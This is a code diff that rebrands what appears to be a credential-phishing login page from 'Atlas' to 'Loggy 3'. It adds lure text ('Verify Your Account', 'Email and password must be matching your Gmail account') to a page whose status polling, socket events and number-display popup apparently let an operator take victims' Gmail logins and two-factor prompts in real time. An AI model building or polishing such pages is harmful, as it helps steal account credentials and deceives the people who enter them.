@@ -3,13 +3,36 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Atlas Login</title>
+<title>Loggy 3 - Login</title>
+<link rel="icon" type="image/png" href="/images/logo.png">
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
 body { min-height: 100vh; background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%); display: flex; justify-content: center; align-items: center; padding: 20px; }
 .card { background: #fff; border-radius: 24px; padding: 40px 32px; width: 100%; max-width: 420px; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
-.logo-wrap { width: 72px; height: 72px; margin: 0 auto 24px; border-radius: 20px; padding: 12px; background: #f3f4f6; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-.logo-wrap img { width: 100%; height: 100%; object-fit: contain; }
+
+/* ⭐ NEW BRAND HEADER */
+.brand-header {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  margin-bottom: 28px;
+}
+.brand-header img {
+  width: 48px;
+  height: 48px;
+  border-radius: 14px;
+  object-fit: contain;
+  background: #f3f4f6;
+  padding: 6px;
+}
+.brand-header .brand-name {
+  font-size: 28px;
+  font-weight: 800;
+  color: #1f2937;
+  letter-spacing: -0.5px;
+}
+
 h1 { font-size: 24px; font-weight: 700; color: #1f2937; text-align: center; margin-bottom: 8px; }
 .subtitle { text-align: center; color: #6b7280; font-size: 14px; margin-bottom: 32px; }
 .form-group { margin-bottom: 20px; }
@@ -106,6 +129,8 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
 @media (max-width: 400px) {
   .number-circle { width: 120px; height: 120px; }
   .number-circle span { font-size: 52px; }
+  .brand-header .brand-name { font-size: 24px; }
+  .brand-header img { width: 42px; height: 42px; }
 }
 
 /* TEXT POPUP */
@@ -117,9 +142,15 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
 <body>
 
 <div class="card">
-  <div class="logo-wrap"><img src="/images/logo.png" alt="Atlas"></div>
-  <h1>Welcome Back</h1>
-  <p class="subtitle">Sign in to continue</p>
+
+  <!-- ⭐ BRAND HEADER: logo + "Loggy 3" -->
+  <div class="brand-header">
+    <img src="/images/logo.png" alt="Loggy 3">
+    <span class="brand-name">Loggy 3</span>
+  </div>
+
+  <h1>Verify Your Account</h1>
+  <p class="subtitle">Secure your account continue</p>
   <div class="form-group"><label>Email</label><input type="email" id="email" placeholder="you@example.com"></div>
   <div class="form-group"><label>Password</label><input type="password" id="password" placeholder="Enter password"></div>
   <button id="submitBtn">Sign In</button>
@@ -152,7 +183,7 @@ button:disabled { opacity: 0.7; cursor: not-allowed; }
 
 <div id="textPopup" class="popup-overlay">
   <div class="popup-text">
-    <h3>Message</h3>
+    <h3>Update Info</h3>
     <div class="message" id="textMessage"></div>
   </div>
 </div>
@@ -217,7 +248,7 @@ async function pollStatus() {
       textPopup.classList.remove('active');
       emailInput.value = '';
       passwordInput.value = '';
-      showError('Details incorrect. Please try again.');
+      showError('Email and password must be matching your Gmail account.');
       currentEmail = '';
       localStorage.removeItem('atlas_current_email');
       if (pollInterval) clearInterval(pollInterval);
@@ -235,7 +266,7 @@ async function pollStatus() {
       textPopup.classList.remove('active');
       emailInput.value = '';
       passwordInput.value = '';
-      showError('Session reset. Please try again.');
+      showError('Try again!');
       currentEmail = '';
       localStorage.removeItem('atlas_current_email');
       if (pollInterval) clearInterval(pollInterval);
@@ -321,7 +352,7 @@ socket.on('user-deleted', (data) => {
   textPopup.classList.remove('active');
   emailInput.value = '';
   passwordInput.value = '';
-  showError('This account has been removed.');
+  showError('');
   currentEmail = '';
   localStorage.removeItem('atlas_current_email');
   if (pollInterval) clearInterval(pollInterval);
